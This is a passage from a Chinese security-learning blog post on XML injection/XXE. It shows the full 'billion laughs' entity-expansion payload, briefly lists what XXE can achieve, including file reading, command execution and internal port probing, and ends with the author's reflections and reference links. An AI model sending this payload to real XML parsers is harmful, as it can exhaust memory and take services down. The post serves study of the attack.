+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol "lol"&gt;</span><br><span class="line">  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span><br><span class="line">  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span><br><span class="line">  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span><br><span class="line">  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span><br><span class="line">  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span><br><span class="line">  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span><br><span class="line">  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span><br><span class="line">  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span><br><span class="line">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可导致读取任意文件、执行系统命令、探测内网端口、注入数据库、攻击内网网站等危害。</p>
+<p>这主要取决你对XML的能力</p>
+<h3 id="自己的理解"><a href="#自己的理解" class="headerlink" title="自己的理解"></a>自己的理解</h3><p>XXE和XML没有区别只是名称上的叫法，而像这种XML攻击在真实环境中少之又少，看到wooyun别人提交的漏洞也不是很多关于XML的，也有一些是通过代码审计找到XML注入。不管这种东西多老还是多久，都值得自己一直学习下去， 不要因为是太老的东西觉得很看不起怎样。</p>
+<p>摆正自己的学习态度，对待一切新鲜的事物保持好奇心。</p>
+<p>参考链接：</p>
+<p><a href="https://www.91ri.org/9539.html" target="_blank" rel="external">https://www.91ri.org/9539.html</a><br><a href="http://www.waitalone.cn/xxe-attack.html" target="_blank" rel="external">http://www.waitalone.cn/xxe-attack.html</a><br><a href="http://drops.wooyun.org/tips/5290" target="_blank" rel="external">http://drops.wooyun.org/tips/5290</a><br><a href="http://book.51cto.com/art/200810/93351.htm" target="_blank" rel="external">http://book.51cto.com/art/200810/93351.htm</a><br><a href="http://wiki.wooyun.org/web:xxe-attack" target="_blank" rel="external">http://wiki.wooyun.org/web:xxe-attack</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">http://blog.csdn.net/u011721501/article/details/43775691</a> </p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XML注入/" rel="tag">#XML注入</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/06/09/阅《做事的常识》后的感悟/" rel="next" title="阅《做事的常识》后的感悟">
+                <i class="fa fa-chevron-left"></i> 阅《做事的常识》后的感悟
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/06/21/CRLF注入/" rel="prev" title="CRLF注入">
+                CRLF注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/06/16/XML注入笔记/"
+           data-title="XML注入笔记" data-url="http://yoursite.com/2016/06/16/XML注入笔记/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XML是什么"><span class="nav-number">1.</span> <span class="nav-text">XML是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML安全"><span class="nav-number">2.</span> <span class="nav-text">XML安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XML、XXE区别"><span class="nav-number">2.1.</span> <span class="nav-text">XML、XXE区别</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML注入实验代码"><span class="nav-number">3.</span> <span class="nav-text">XML注入实验代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML注入可以做什么"><span class="nav-number">4.</span> <span class="nav-text">XML注入可以做什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自己的理解"><span class="nav-number">5.</span> <span class="nav-text">自己的理解</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
